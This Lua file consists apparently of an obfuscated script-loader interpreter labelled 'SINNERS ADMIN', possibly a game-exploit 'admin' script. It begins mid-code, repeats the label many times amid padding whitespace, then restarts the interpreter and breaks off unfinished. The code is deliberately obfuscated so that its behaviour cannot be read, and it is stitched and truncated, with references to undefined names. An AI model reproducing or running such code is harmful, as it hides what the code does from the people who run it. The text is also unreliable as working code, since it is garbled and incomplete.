-0]==v90[v92[15 -11]])) then v72=v72 + (1104 -((1010 -673) + 766));else v72=v92[3 + 0];end elseif ((v93<=(1860 -(227 + 1596))) or ((3652 -2344)==3930)) then local v172=(1957 -(1025 + 932)) + 0;local v173;local v174;local v175;local v176;local v177;local v178;while true do if ((v172==(1634 -(670 + 962))) or (((1945 + 3166) -(9145 -5533))>3245)) then v177=nil;v178=nil;v172=2 + 1;end if ((v172==(1932 -(477 + 1452))) or (((4920 -(389 + 48)) -2906)>=2932)) then while true do if ((v173==(1 + 0)) or ((71 + 4566)<(8940 -4556))) then local v242=0 + 0;while true do if (((11419 -6713)==(14538 -9832)) and (v242==((2 -1) + 0))) then v173=1701 -(986 + 713);break;end if (((1073 -((318 -(115 + 196)) + 4))<(6537 -2879)) and ((0 -0)==v242)) then v176=nil;v177=nil;v242=1 + 0;end end end if ((v173==(697 -(253 + 442))) or ((10368 -7370)==(1837 -877))) then v178=nil;while true do if ((v174==(291 -((520 -(185 + 145)) + 100))) or ((1339 + 653)>=(2621 -(9 + 336 + 227)))) then local v270=0 + 0;local v271;while true do if ((v270==(1424 -((1093 -811) + 1142))) or (2370>=3273)) then v271=0;while true do if ((4477>=3514) and (v271==(739 -(321 + 417)))) then v174=1 + 1;break;end if ((v271==(1736 -(592 + 1144))) or (3784==(2750 + 564))) then v73=(v177 + v175) -(4 -(3 -0));v178=0 + 0;v271=1;end end break;end end end if ((v174==(1143 -(69 + 1074))) or ((13418 -9885)==((6991 -5219) -(563 + 811)))) then local v272=0;local v273;while true do if ((v272==(0 + 0)) or (((1080 -675) + 1728)>4761)) then v273=0 + 0;while true do if (((5748 -(4584 -(736 + 248)))>=(219 + 1064)) and (v273==(920 -(205 + 715)))) then v175=v92[813 -(203 + 608)];v176,v177=v87(v90[v175](v13(v90,v175 + 1,v92[(298 + 243) -(395 + 143)])));v273=1 + 0;end if (((4761 -(2529 -(1304 + 249)))>=(641 + (2158 -(1003 + 661)))) and (v273==(323 -(115 + 207)))) then v174=1945 -((4838 -3144) + 250);break;end end break;end end end if (((2553 -(748 + 308))<(2487 + 181)) and (v174==2)) then for v275=v175,v73 do local v276=0 + 0;while true do if ((v276==(0 -0)) or ((7955 -5253)<(4626 -2231))) then v178=v178 + 1 + 0;v90[v275]=v176[v178];break;end end end break;end end break;end if (((1856 -(96 + 1477))<(8217 -5766)) and (v173==(0 + 0))) then local v243=0 + 0;while true do if (((1140 -(157 + 813))==(1402 -(368 + 864))) and ((0 + 0)==v243)) then v174=0 + 0;v175=nil;v243=1 -(0 -0);end if ((v243==(690 -(58 + 631))) or ((78 + (4495 -3315))==(5639 -1835))) then v173=1 + 0;break;end end end end break;end if ((v172==(1725 -(1260 + 362 + 103))) or (((8403 + 242) -4803)<(3144 + 464))) then v173=0;v174=nil;v172=(2 + 1) -2;end if (((1528 -(268 + 7))==(3465 -2212)) and ((969 -(655 + (487 -174)))==v172)) then v175=nil;v176=nil;v172=900 -(746 + 152);end end elseif (((4088 -(383 + 354))>=(6100 -3490)) and (v93==(57 -19))) then v90[v92[2]][v92[5 -(1 + 1)]]=v92[4 -(0 + 0)];else local v215=0;local v216;while true do if ((v215==(1792 -(538 + 1254))) or ((159 -78)>(2978 -1498))) then v216=v92[1 + 1];v90[v216]=v90[v216](v13(v90,v216 + (1498 -(978 + 113 + 406)),v92[3]));break;end end end v72=v72 + 1 + 0;break;end end break;end end end end A,B=v27(v11(v76));if  not A[1] then local v94=0;local v95;while true do if (v94==0) then v95=v35[4][v72] or "?";error("Script error at ["   .. v95   .. "]:"   .. A[2]);break;end end else return v13(A,2,B);end end;end if (0==v59) then v60=v35[1];v61=v35[2];v59=1;end end end return v29(v28(),{},v17)();end vv9());break;end if (v0==0) then v1=tonumber;v2=string.byte;v3=string.char;v0=1;end if (v0==2) then v7=table.concat;v8=table.insert;v9=getfenv or function()return _ENV;end;v0=3;end if (v0==1) then v4=string.sub;v5=string.gsub;v6=string.rep;v0=2;end if (v0==3) then v10=setmetatable;v11=pcall;v12=select;v0=4;end end end
--
--
print("SINNERS ADMIN")
---
---
print("SINNERS ADMIN")
---
print("SINNERS ADMIN")

------
print("SINNERS ADMIN")

----
print("SINNERS ADMIN")

print("SINNERS ADMIN")

---------------------
print("SINNERS ADMIN")
---
print("SINNERS ADMIN")


print("SINNERS ADMIN")
------
print("SINNERS ADMIN")
--
print("SINNERS ADMIN")


----------------
print("SINNERS ADMIN")


----------------------------------
print("SINNERS ADMIN")

-----
print("SINNERS ADMIN")
-----------
-------------------------
print("SINNERS ADMIN")


-----------
------------------
print("SINNERS ADMIN")

-----
print("SINNERS ADMIN")

print("SINNERS ADMIN")
----------------------------------------------------------
print("SINNERS ADMIN")






------------------------------------------------
print("SINNERS ADMIN")
















---------------------------------------
print("SINNERS ADMIN")























---------------------------------------
print("SINNERS ADMIN")


































































































































































































































































































































































do local v0=0;local v1;local v2;local v3;local v4;local v5;local v6;local v7;local v8;local v9;local v10;local v11;local v12;local v13;local v14;local v15;while true do if (v0==0) then v1=tonumber;v2=string.byte;v3=string.char;v4=string.sub;v0=1;end if (v0==4) then vv9());break;end if (v0==2) then v9=getfenv or function()return _ENV;end;v10=setmetatable;v11=pcall;v12=select;v0=3;end if (v0==1) then v5=string.gsub;v6=string.rep;v7=table.concat;v8=table.insert;v0=2;end if (v0==3) then v13=unpack or table.unpack;v14=tonumber;v15=nil;function v15(v16,v17)local v18=1;local v19;v16=v5(v4(v16,5),"..",function(v30)if (v2(v30,2)==79) then v19=v1(v4(v30,1,1));return "";else local v62=v3(v1(v30,16));if v19 then local v74=v6(v62,v19);v19=nil;return v74;else return v62;end end end);local function v20(v31,v32,v33)if v33 then local v63=0 -0;local v64;while true do if (v63==(0 + 0)) then v64=(v31/((6 -4)^(v32-(3 -2))))%(2^(((v33-(1 -0)) -(v32-(1804 -((2504 -954) + 253)))) + (4 -3) + (238 -(52 + 186))));return v64-(v64%1);end end else local v65=(1907 -(1904 + 1))^(v32-(1 + 0));return (((v31%(v65 + v65))>=v65) and ((2 -1) + 0)) or (0 + 0);end end local function v21()local v38=v2(v16,v18,v18);v18=v18 + 1;return v38;end local function v22()local v39,v40=v2(v16,v18,v18 + (7 -5));v18=v18 + (192 -(180 + 10));return (v40 * (636 -380)) + v39;end local function v23()local v41,v42,v43,v44=v2(v16,v18,v18 + 3);v18=v18 + (561 -(19 + 538));return (v44 * (16777816 -(297 + 303))) + (v43 * 65536) + (v42 * (212 + 16 + 28)) + v41;end local function v24()local v45=v23();local v46=v23();return (( -((1126 -(1021 + 103)) + 0) * v20(v46,(1597 -(1563 + 15)) + 13)) + 1 + 0) * ((1 + 1)^(v20(v46,25 -4,31) -((2344 -1839) + 518))) * ((((v20(v46,761 -(317 + 443),89 -69) * (2^(61 -29))) + v45)/((1 + 1)^(42 + 10))) + (230 -(220 + 9)));end local function v25(v34)local v47;if  not v34 then v34=v23();if (v34==(0 -0)) then return "";end end v47=v4(v16,v18,(v18 + v34) -(2 -1));v18=v18 + v34;local v48={};for v60=1913 -(855 + 1057), #v47 do v48[v60]=v3(v2(v4(v47,v60,v60)));end return v7(v48);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v49=0 -0;local v50;local v51;local v52;local v53;local v54;local v55;local v56;while true do if (v49==0) then local v71=0 -0;while true do if (v71==(1 + 0)) then v49=1;break;end if (v71==(0 + 0)) then local v93=0;while true do if (v93~=1) then else v71=1;break;end if (v93~=0) then else v50=0;v51=nil;v93=1;end end end end end if (3==v49) then v56=nil;while true do local v75=0 + 0;local v76;while true do if (v75==(0 -0)) then v76=0;while true do if (v76==(1 -0)) then if (v50~=(396 -(341 + 54))) then else local v99=0;while true do if (v99==(1 + 0)) then v56={};v50=2;break;end if (v99==0) then v54={v51,v52,nil,v53};v55=v23();v99=1;end end end if (v50~=(1762 -(1072 + 687))) then else local v100=267 -(260 + 7);local v101;while true do if ((1723 -(590 + 1133))~=v100) then else v101=0;while true do local v102=0;local v103;while true do if (v102==(1183 -(165 + 1018))) then v103=0 -0;while true do if (v103==0) then if (v101~=(1355 -(1113 + 241))) then else return v54;end if (v101==(0 -0)) then local v157=0 -0;local v158;while true do if (v157==0) then v158=0 + 0;while true do if (v158==1) then v101=1583 -(1505 + 77);break;end if (v158==(0 -0)) then local v204=0 + 0;while true do if (v204==(1721 -(277 + 1444))) then for v217=1277 -(698 + 578),v23() do v52[v217-1]=v28();end for v219=1135 -(792 + 342),v23() do v53[v219]=v23();end v204=1;end if (v204==(3 -2)) then v158=4 -3;break;end end end end break;end end end break;end end break;end end end break;end end end break;end if (v76==0) then local v96=0 -0;local v97;while true do if (0==v96) then v97=0;while true do if (v97~=0) then else if (v50~=(1505 -(1458 + 45))) then else local v104=0;while true do if (v104==(0 -0)) then local v109=0 + 0;while true do if (v109~=(0 + 0)) then else local v159=0;while true do if (v159==(1 + 0)) then v109=1 -0;break;end if (v159==0) then for v191=1,v55 do local v192=0;local v193;local v194;local v195;local v196;while true do if (v192==1) then v195=nil;v196=nil;v192=2;end if (v192~=2) then else while true do if (v193==0) then local v221=0;local v222;while true do if ((0 + 0)==v221) then v222=0 + 0;while true do if (v222==1) then v193=1 + 0;break;end if (v222~=(0 + 0)) then else local v237=0;while true do if (v237~=1) then else v222=1;break;end if (v237~=(146 -(54 + 92))) then else v194=0;v195=nil;v237=1 + 0;end end end end break;end end end if (v193==1) then v196=nil;while true do if (v194==(436 -(110 + 325))) then if (v195==(253 -(24 + 228))) then v196=v21()~=(868 -(518 + 350));elseif (v195==2) then v196=v24();elseif (v195~=(848 -(322 + 523))) then else v196=v25();end v56[v191]=v196;break;end if (v194~=(0 -0)) then else local v231=0 + 0;local v232;local v233;while true do if (v231==(91 -(17 + 74))) then v232=0;v233=nil;v231=512 -(45 + 466);end if (v231==(1 + 0)) then while true do if (v232~=(0 -0)) then else v233=0 -0;while true do if (v233~=(0 + 0)) then else local v248=0;while true do if (v248~=(179 -(119 + 60))) then else v195=v21();v196=nil;v248=1;end if (v248~=1) then else v233=55 -(36 + 18);break;end end end if (v233~=(1981 -(1651 + 329))) then else v194=1;break;end end break;end end break;end end end end break;end end break;end if (v192==0) then v193=0;v194=nil;v192=1;end end end v54[56 -(28 + 25)]=v21();v159=1 + 0;end end end if (1==v109) then v104=1;break;end end end if (v104==(1611 -(939 + 671))) then for v150=2 -1,v23() do local v151=0;local v152;local v153;local v154;while true do if (v151==1) then v154=nil;while true do if (v152~=1) then else while true do if (v153~=(0 + 0)) then else v154=v21();if (v20(v154,1 + 0,1 + 0)==0) then local v211=0;local v212;local v213;local v214;local v215;local v216;while true do if (v211~=(2 + 0)) then else v216=nil;while true do if (v212~=0) then else v213=525 -(411 + 114);v214=nil;v212=1 -0;end if (v212~=1) then else local v236=0;while true do if (v236~=(1 + 0)) then else v212=2;break;end if (0==v236) then v215=nil;v216=nil;v236=934 -(168 + 765);end end end if (v212==2) then while true do if (v213~=(1 + 1)) then else if (v20(v215,1020 -(405 + 614),1 + 0)~=(1 + 0)) then else v216[779 -(280 + 497)]=v56[v216[2 -0]];end if (v20(v215,1677 -(858 + 817),2)==1) then v216[3]=v56[v216[1966 -(272 + 1691)]];end v213=11 -8;end if (1~=v213) then else local v240=0;while true do if (v240~=(283 -(112 + 171))) then else v216={v22(),v22(),nil,nil};if (v214==0) then local v249=0 -0;while true do if (v249==(0 + 0)) then v216[1 + 2]=v22();v216[4]=v22();break;end end elseif (v214==1) then v216[1722 -(74 + 1645)]=v23();elseif (v214==2) then v216[738 -(309 + 426)]=v23() -((2 -0)^16);elseif (v214==3) then local v254=0;while true do if (v254~=0) then else v216[3]=v23() -(2^16);v216[8 -4]=v22();break;end end end v240=2 -1;end if (v240~=1) then else v213=1 + 1;break;end end end if (v213==(1739 -(1216 + 523))) then local v241=925 -(115 + 810);while true do if (v241~=0) then else v214=v20(v154,2,2 + 1);v215=v20(v154,4,6);v241=1 + 0;end if (v241==1) then v213=1 -0;break;end end end if (v213==(104 -(90 + 11))) then if (v20(v215,3,3)==(918 -(707 + 210))) then v216[4]=v56[v216[3 + 1]];end v51[v150]=v216;break;end end break;end end break;end if (v211==(0 -0)) then v212=290 -(20 + 270);v213=nil;v211=1997 -(1681 + 315);end if (v211~=1) then else v214=nil;v215=nil;v211=2 + 0;end end end break;end end break;end if (0==v152) then v153=0;v154=nil;v152=1 + 0;end end break;end if (v151==(437 -(142 + 295))) then v152=1883 -(1178 + 705);v153=nil;v151=3 -2;end end end v50=8 -5;break;end end end if (v50==0) then local v105=0;local v106;local v107;while true do if (v105~=(3 -2)) then else while true do if (v106~=0) then else v107=0 + 0;while true do if (v107==(0 + 0)) then local v184=634 -(174 + 460);while true do if (v184~=(0 + 0)) then else v51={};v52={};v184=1799 -(15 + 1783);end if ((1 + 0)~=v184) then else v107=1;break;end end end if (v107~=(1 + 0)) then else v53={};v50=1 + 0;break;end end break;end end break;end if (v105~=0) then else v106=0;v107=nil;v105=1;end end end v97=1 + 0;end if (v97~=1) then else v76=1 + 0;break;end end break;end end end end break;end end end break;end if (v49~=(2 -1)) then else local v72=0;while true do if (v72~=0) then else v52=nil;v53=nil;v72=1228 -(1134 + 93);end if (v72==1) then v49=261 -(218 + 41);break;end end end if (v49==2) then local v73=1352 -(993 + 359);while true do if ((981 -(99 + 881))~=v73) then else v49=2 + 1;break;end if (v73==(0 + 0)) then v54=nil;v55=nil;v73=1149 -(1146 + 2);end end end end end local function v29(v35,v36,v37)local v57=v35[1];local v58=v35[2];local v59=v35[3];return function(...)local v66=1;local v67= -1;local v68={...};local v69=v12("#",...) -1;local function v70()local v77=v57;local v78=Const;local v79=v58;local v80=v59;local v81=v27;local v82={};local v83={};local v84={};for v90=0 + 0,v69 do if ((((665 + 169) -430)==(539 -(14 + 121))) and (v90>=v80)) then v82[v90-v80]=v68[v90 + (2 -1)];else v84[v90]=v68[v90 + (361 -(126 + 234))];end end local v85=(v69-v80) + (1627 -(1222 + 404));local v86;local v87;while true do local v91=0 -0;local v92;while true do if (((6973 -4044)>=(1891 -(1069 + 559))) and (v91==(0 -0))) then v92=0 -0;while true do if ((v92==(1471 -(1036 + 435))) or ((2403 -(550 + 1427))>=(6605 -3206))) then local v98=0 -(0 + 0);while true do if (((3401 + 1096)>=(2490 + (3925 -2433))) and (v98==(0 -0))) then v86=v77[v66];v87=v86[2 -1];v98=1 + 0;end if ((v98==(1 + 0)) or ((1791 + 382)>(3888 + 692))) then v92=1 + 0;break;end end end if ((v92==(1 + 0)) or ((2743 -(2342 -(426 + 324)))==(3838 -(1035 + 733)))) then if ((v87<=(444 -(297 + 134))) or ((13848 -10128)>(4830 -(368 + 724)))) then if (((6481 -2683)==(354 + 3444)) and (v87<=(6 + 0))) then if (((7225 -5065)==(2556 -(285 + 111))) and (v87<=(551 -(224 + 325)))) then if ((v87<=(1106 -(16 + 1090))) or ((353 + 62)>=(2262 -(36 + 813)))) then if ((v86[2 -0]==v84[v86[5 -1]]) or ((2347 + 2049)<(1976 + 495))) then v66=v66 + (1202 -(1176 + 25));else v66=v86[1 + 2];end elseif (((5677 -2741)==(5210 -2274)) and (v87==(1345 -(21 + 1323)))) then local v110=0 + 0;local v111;local v112;local v113;while true do if ((v110==(1 + 0)) or ((2049 -(280 + 486))==(12764 -8814))) then v113=nil;while true do if ((v111==(1 + 0)) or ((1907 -(538 + (1905 -(1486 + 351))))>(3296 -(720 + 99 + 27)))) then v84[v112 + (1103 -(987 + (330 -215)))]=v113;v84[v112]=v113[v86[966 -(371 + 591)]];break;end if (((4926 -(1296 + (422 -278)))>=(2427 + 659)) and (v111==(0 + 0))) then local v187=0 + 0;local v188;while true do if (((934 + 1067)>(370 + 232)) and (v187==(0 + 0))) then v188=0 -0;while true do if ((((7087 -4224) -(43 + (499 -(86 + 315))))==((5730 -(662 + 836)) -(848 + 662))) and (v188==(1782 -(511 + 1270)))) then v111=1509 -(1139 + 369);break;end if ((v188==(0 + 0)) or ((10583 -7931)<(581 + 1512))) then v112=v86[1773 -(59 + 1712)];v113=v84[v86[439 -(254 + 182)]];v188=1815 -((3401 -(1156 + 823)) + 392);end end break;end end end end break;end if (((578 -326)==(344 -((213 -124) + 3))) and (v110==(301 -(39 + 262)))) then local v160=629 -(194 + 435);while true do if (((1608 -(1021 + 471))<(1671 -(85 + 554 + 624))) and (v160==(1509 -(147 + 1361)))) then v110=1228 -(261 + 966);break;end if (((1832 -403)<=(1347 + 2524)) and (v160==(0 + (462 -(204 + 258))))) then v111=676 -(406 + 270);v112=nil;v160=2 -1;end end end end else for v155=v86[(1273 -(335 + 936)) + 0],v86[1 + 2] do v84[v155]=nil;end end elseif ((v87<=(3 + 1)) or ((108 + 840)>(1656 + 2578))) then if (((5343 -(45 + 314))>(244 + 128)) and (v87==3)) then do return;end else local v114=0 -0;local v115;local v116;while true do if (((198 + 3762)<(9010 -4911)) and (v114==((836 -532) -(167 + 136)))) then for v165=(2 -1) + 0, #v83 do local v166=0 + 0;local v167;while true do if ((v166==((496 + 1197) -(1304 + 389))) or ((16999 -12312)<(173 + 191))) then v167=v83[v165];for v197=0 + 0, #v167 do local v198=0 -0;local v199;local v200;local v201;local v202;while true do if ((v198==(1 -0)) or ((401 -(7 + 213 + 159))==(239 + 146))) then v201=nil;v202=nil;v198=8 -6;end if ((v198==(698 -(233 + 465))) or ((3426 -1644)<=(304 + 1258))) then local v206=0 + 0;while true do if (((0 + 0)==v206) or ((495 -265)>(5082 -(959 + 125)))) then v199=0 + 0;v200=nil;v206=2 -1;end if (((9800 -6070)>(10105 -6700)) and (v206==(1205 -(180 + 1024)))) then v198=(2 -1) -0;break;end end end if ((v198==(1625 -(956 + 667))) or ((2531 + 1060)==(2861 + 1464))) then while true do if ((((1480 -(57 + 242)) -(90 + 809))==(2261 -(1168 + 811))) and (((2363 -(733 + 895)) -(681 + 36 + 18))==v199)) then local v226=566 -((972 -543) + 137);local v227;while true do if ((((1739 -(780 + 343)) + 2103)>=(1483 + 45)) and (v226==(0 + 0))) then v227=0 + 0;while true do if ((v227==(1 + 0 + (1506 -(921 + 585)))) or ((2680 -1849)==(5450 -(935 + 872)))) then v199=2 -1;break;end if ((v227==(0 + 0)) or ((4047 -(28 + 39))>=(5642 -(683 + 420)))) then local v238=0 + 0;while true do if (((4749 -(142 + 997))<=(2324 + 2348)) and (v238==((1 + 3) -3))) then v227=1 + 0;break;end if ((v238==(0 -0)) or ((10094 -6315)==(253 -50))) then v200=v167[v197];v201=v200[1 + 0];v238=1 + 0;end end end end break;end end end if ((v199==(2 -1)) or ((12942 -8196)<=(12314 -8180))) then v202=v200[(80 + 290) -(34 + 334)];if (((524 + (3864 -(661 + 1103)))>(1588 -1121)) and (v201==v84) and (v202>=v115)) then local v234=0 + 0;local v235;while true do if (((3295 -1595)<=(3057 + 249)) and (v234==(952 -(42 + 910)))) then v235=0 + 0;while true do if ((v235==(0 -0)) or ((4384 -1914)>(1308 + 1874 + 207))) then v116[v202]=v201[v202];v200[1 + 0]=v116;break;end end break;end end end break;end end break;end end end break;end end end break;end if (((1983 -1196)<=(1693 + 276)) and (v114==(0 + 0))) then local v161=0;while true do if (((5306 -(654 + 978))==(4929 -(805 + 450))) and (v161==(1041 -((3728 -2750) + 62)))) then v114=162 -(82 + 79);break;end if ((v161==(0 -0)) or ((19649 -15423)<(49 + 134))) then v115=v86[1449 -(99 + 1348)];v116={};v161=(1 -0) -0;end end end end end elseif ((v87==(9 -4)) or ((2947 -(543 + 514))>=(3164 + 98))) then local v117=0 + 0;local v118;local v119;local v120;while true do if ((v117==(313 -(246 + 67))) or ((6897 -4519)>=(1729 + 2069))) then v118=(1616 -(408 + 1208)) -0;v119=nil;v117=881 -(786 + 94);end if (((4019 -787)>(1711 -(2143 -(704 + 381)))) and (v117==(2 -1))) then v120=nil;while true do if (((1938 -((1836 -(118 + 36)) + 255))==v118) or ((2723 + 1470)<=(1113 -653))) then while true do if (((0 + 0)==v119) or ((4898 -2682)<=(1236 -593))) then v120=v86[2];v84[v120]=v84[v120](v84[v120 + (1767 -(394 + 1372))]);break;end end break;end if (((0 + 0)==v118) or ((371 + 1934)<=(3590 -(901 + 534)))) then local v189=1152 -(1140 + 12);while true do if ((v189==(0 + 0)) or ((1056 -641)==(2462 + 719))) then v119=0 + 0;v120=nil;v189=1 -0;end if ((((784 + 5050) -3794)<=(4012 -1469)) and (v189==(2 -1))) then v118=1 + 0;break;end end end end break;end end else local v121=1385 -(1007 + 378);local v122;while true do if (((215 + 3484)<=(1746 + 1978)) and (v121==(1295 -(173 + 1122)))) then v122=v86[2 + 0];v84[v122]=v84[v122](v13(v84,v122 + (1 -(0 -0)),v86[1936 -(326 + 1607)]));break;end end end elseif (((3203 -2381)==(2254 -1432)) and (v87<=(30 -21))) then if ((v87<=(2 + 5)) or ((5386 -2643)>(417 + 2395))) then if (((6133 -4080)>=(1482 -1009)) and (v84[v86[877 -(149 + 726)]]~=v86[641 -(305 + (1722 -(385 + 1005)))])) then v66=v66 + (567 -(51 + 515));else v66=v86[3 -0];end elseif ((v87>((1534 -945) -(89 + 492))) or ((5733 -(180 + 734))<=(357 + 1042))) then v84[v86[5 -3]]=v37[v86[5 -2]];else local v124=1718 -(576 + 1142);local v125;while true do if ((818<=(5286 -(73 + 701))) and (v124==(0 + 0))) then v125=v86[(2 -1) + 1];v84[v125](v13(v84,v125 + 1 + 0,v86[(4 -3) + (7 -5)]));break;end end end elseif ((v87<=(6 + 5)) or ((3076 -(665 + 44))==(1027 + 2751))) then if (((12 + 4044 + 299)>(2718 + 1503)) and (v87>(29 -19))) then local v126=0 + 0 + 0;local v127;local v128;while true do if ((v126==1) or ((1478 + 1343)<(1849 -(1242 + 361)))) then while true do if (((6215 -(383 + 1490))>=(12935 -9776)) and (v127==(0 + 0))) then v128=v86[1551 -(138 + 1411)];do return v13(v84,v128,v128 + v86[2 + 1]);end break;end end break;end if ((v126==(0 -0)) or ((10221 -7012)<(458 -((784 -504) + (119 -71))))) then local v163=0 -0;while true do if ((v163==(0 + 0)) or ((5002 -(1326 + 519))<(2765 -1158))) then v127=0 -0;v128=nil;v163=1 + 0;end if ((v163==(3 -2)) or (1176>=(7170 -2288))) then v126=1 + 0;break;end end end end else v84[v86[690 -(428 + 260)]]={};end elseif (((6722 -4188)==(3281 -(300 + 447))) and (v87>(1232 -(20 + 258 + 942)))) then v84[v86[5 -3]]=v86[3 + 0]~=(252 -(208 + 44));else v66=v86[641 -(222 + 416)];end elseif (((3184 -1282)==(7034 -5132)) and (v87<=((14 -7) + 13))) then if (((4325 -(38 + 819))<=(4296 -(33 + 1 + 483))) and (v87<=(13 + 3))) then if ((v87<=(6 + 8)) or ((265 + 3164)>(2808 + 2136))) then do return v84[v86[2 -0]];end elseif ((v87>(13 + 2)) or (4810<(2652 -(343 + 800)))) then local v131=411 -(124 + 287);local v132;local v133;while true do if ((v131==(1 -0)) or ((3118 -(1370 + 150))>=((9196 -5487) + 887))) then while true do if ((v132==(0 + 0)) or ((983 -(431 + 281 + 118))>(18 + 983 + 788))) then v133=v86[(645 -(51 + 592)) + 0];do return v13(v84,v133,v67);end break;end end break;end if ((v131==(0 + 0)) or ((7907 -5739)<(3995 -2406))) then v132=1132 -(606 + 526);v133=nil;v131=1 + 0;end end elseif (((90 + (2190 -(475 + 831)))<=(731 + 1769)) and v84[v86[2]]) then v66=v66 + ((1706 -(7 + 26)) -(1412 + 260));else v66=v86[14 -11];end elseif (((3013 -(910 + 175))>=(1000 + 7)) and (v87<=((134 -(10 + 115)) + 9))) then if (((4129 -976)<=((6118 -(191 + 275)) -1665)) and (v87==(789 -(625 + 147)))) then v84[v86[(594 + 1283) -(1818 + 57)]]=v36[v86[128 -(74 + 51)]];else v84[v86[4 -2]]=v86[(472 -(206 + 258)) -5];end elseif ((v87>(368 -(274 + (271 -196)))) or ((1581 -(11 + 1448))>=(68 + 3287))) then local v136=0 + 0;local v137;local v138;while true do if (((2142 + 2644)>=((3524 -(598 + 1287)) -983)) and (v136==(458 -(456 + 1)))) then while true do if (((1182 + (2217 -(715 + 509)))<(10109 -7584)) and (v137==(0 + 0))) then v138=v86[2 + 0];do return v84[v138](v13(v84,v138 + (2 -1),v86[8 -5]));end break;end end break;end if (((248 + 812 + 1465)==(3726 -1201)) and (v136==(0 + 0))) then v137=0 -(1710 -(784 + 926));v138=nil;v136=3 -2;end end else v37[v86[231 -((91 -29) + 166)]]=v84[v86[1293 -((1619 -(322 + 36)) + 30)]];end elseif (((608 + 373)<=(4650 -2958)) and (v87<=(84 -61))) then if (((1967 -(520 + 579))<(5122 -3365)) and (v87<=(1814 -(1791 + 2)))) then v84[v86[1076 -(77 + 997)]][v86[1131 -(1078 + 50)]]=v84[v86[1336 -(799 + 150 + 383)]];elseif ((v87==(15 + (1609 -(641 + 961)))) or (((3311 -(892 + 92)) + 69)>=(4372 -(195 + 114 + 98)))) then v84[v86[5 -3]]=v84[v86[2 + 1]];else local v141=1449 -(703 + 746);local v142;local v143;local v144;while true do if (((7716 -4033)==(4481 -(496 + 302))) and (v141==(1 + 0 + 0))) then v144=nil;while true do if (((173 + 962)<=(3872 -1755)) and (v142==((2119 -(598 + 309)) -(977 + 234)))) then while true do if (((4037 -2137)<(4301 -2213)) and ((291 -(64 + 191 + 36))==v143)) then v144=v84[v86[2 + (5 -3)]];if (((1532 + 1043)<=(5055 -(1121 + 630))) and  not v144) then InstrPoint=InstrPoint + (1943 -(486 + 1456)) + (0 -0);else local v207=0 -0;local v208;local v209;while true do if (((7816 -(4157 -(648 + 35)))==(1008 + 3334)) and (v207==(519 -(59 + 459)))) then while true do if (((9983 -6478)<(16232 -(25445 -13537))) and (v208==(0 -0))) then v209=0 -0;while true do if ((v209==(1395 -(1018 + 377))) or ((499 + 636 + 270)>(13891 -9159))) then v84[v86[1 + 1]]=v144;InstrPoint=v86[1392 -(822 + 245 + 202 + 120)];break;end end break;end end break;end if ((v207==(0 -0)) or ((2858 -(382 + 1570))>=(5637 -(579 + 771 + 103)))) then v208=0 -0;v209=nil;v207=1672 -(636 + 1035);end end end break;end end break;end if ((v142==(241 -((294 -(57 + 15)) + 19))) or ((2291 + 806)>=(4222 -(537 + 155)))) then local v190=0 -0;while true do if (((7394 -4810)>(5416 -3844)) and ((1 -0)==v190)) then v142=2 -1;break;end if ((v190==(0 + 0)) or ((111 + 1247 + 890)==(1104 -737))) then v143=(0 -0) -0;v144=nil;v190=592 -(262 + 329);end end end end break;end if ((v141==(0 + 0)) or (4241<((5940 -(1371 + 132)) -(317 + 1308)))) then v142=0 -0;v143=nil;v141=1;end end end elseif ((v87<=(43 -(47 -29))) or ((14367 -9629)==(221 + 3825))) then if (((5533 -(667 + 794))>=(3772 -(43 + (913 -(203 + 557))))) and (v87>(111 -87))) then local v145=(0 + 0) -(1744 -(877 + 867));local v146;local v147;local v148;while true do if ((v145==0) or ((1967 -(657 + 1241))>=(3626 -(2148 -(360 + 605))))) then v146=v79[v86[1 + 2]];v147=nil;v145=1248 -(485 + 762);end if (((2002 + 2420)>=(7539 -4370)) and (v145==((3 + 1) -2))) then for v168=1140 -(606 + (930 -(19 + 378))),v86[4 + 0] do local v169=1381 -(330 + 1051);local v170;local v171;local v172;while true do if ((((2492 + 632) -(27 + 949))==(2846 -((758 -550) + 490))) and ((679 -(298 + 380))==v169)) then v172=nil;while true do if (((3528 -(2772 -(438 + 707)))==(3662 -(993 + 768))) and ((1093 -(967 + (548 -423)))==v170)) then while true do if ((1520<(5066 -(581 + 454))) and (v171==(0 + 0))) then local v223=317 -(181 + 136);local v224;while true do if (((683 -414)<(1780 + 3112)) and (0==v223)) then v224=0;while true do if (((68 + 3609)>=(2449 -(1169 + 487))) and ((1138 -(583 + 555))==v224)) then v66=v66 + (1446 -(152 + 1293));v172=v77[v66];v224=1116 -(139 + 740 + 236);end if ((v224==(1 -0)) or ((313 + 1235 + 479)<(7011 -5243))) then v171=1 -0;break;end end break;end end end if (((678 -(100 + 577))==v171) or ((1064 + 169 + 520)>(3811 -(485 + 329)))) then if ((((3003 -(106 + 1222)) + (9530 -6518))>(2039 -(855 + 454))) and (v172[1616 -(399 + 1216)]==(2 + 20))) then v148[v168-(1 -0)]={v84,v172[7 -4]};else v148[v168-(1 + 0)]={v36,v172[3 + 0]};end v83[ #v83 + (1333 -(211 + 74 + 1047))]=v148;break;end end break;end if (((1876 + 1476)==(4756 -(1109 + 295))) and (v170==(1055 -(635 + 48 + 372)))) then v171=1825 -(1751 + 74);v172=nil;v170=1045 -((419 -227) + 852);end end break;end if ((v169==0) or ((12036 -8378)==(111 + 1029))) then v170=0 + 0;v171=nil;v169=852 -(291 + 560);end end end v84[v86[1 + 1]]=v29(v146,v147,v37);break;end if ((4809<((30422 -24026) -(944 + 518))) and ((97 -(49 + 47))==v145)) then v148={};v147=v10({},{__index=function(v173,v174)local v178=0 -(904 -(854 + 50));local v179;local v180;while true do if (((8787 -5274)<=(984 + 3580)) and (((266 -(166 + 100)) -(0 + 0))==v178)) then v179=0 -0;v180=nil;v178=(599 -(55 + 543)) + 0;end if (((2035 + 1466)<(5949 -(787 + (1736 -1088)))) and (v178==(1 + 0))) then while true do if ((v179==(0 -0)) or (927>=(3079 + 452))) then local v210=0 -0;while true do if (((5511 -(4585 -(575 + 320)))<(5228 -(63 + 923))) and (v210==(0 -0))) then v180=v148[v174];return v180[1 + 0 + 0][v180[2]];end end end end break;end end end,__newindex=function(v175,v176,v177)local v181=350 -(7 + 164 + 179);local v182;while true do if (((3171 -(1867 -681))==(3423 -(1512 -(34 + 40)))) and (v181==(488 -(183 + 305)))) then v182=v148[v176];v182[635 -(459 + 175)][v182[7 -5]]=v177;break;end end end});v145=5 -3;end end else 